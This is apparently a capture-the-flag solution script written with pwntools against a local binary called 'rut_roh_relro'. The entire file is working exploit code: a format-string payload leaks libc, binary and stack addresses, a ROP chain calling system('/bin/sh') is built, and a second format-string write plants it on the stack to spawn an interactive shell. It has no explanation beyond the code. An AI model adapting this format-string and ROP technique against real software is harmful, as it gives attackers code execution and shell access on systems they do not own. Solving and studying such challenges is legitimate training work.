#! /usr/bin/python3

from pwn import *

p = process('./rut_roh_relro')
e = ELF("./rut_roh_relro")
libc = ELF('./libc.so.6')

context.binary = e
context.log_level = "debug"

payload = b'%71$p %70$p %68$p'
#pause()
p.sendlineafter(b'post?\n', payload)
p.recvuntil(b'0x')
libc.address = int(p.recvuntil(b' ')[:-1], 16) - 0x23c20 - 234

p.recvuntil(b'0x')
e.address = int(p.recvuntil(b' ')[:-1], 16) - 0x1220

p.recvuntil(b'0x')
stack_address = int(p.recvuntil(b'\n')[:-1], 16) - 0x2f0

print(hex(libc.address))
print(hex(e.address))
print(hex(stack_address))

rop_chain = ROP([e, libc], badchars=b'\n')
rop_chain.system(next(libc.search(b'/bin/sh\0')))
log.info(rop_chain.dump)

payload = fmtstr_payload(6, {stack_address+0x208:rop_chain.chain()})
# pause()
p.sendlineafter(b'post?\n', payload)

p.interactive()
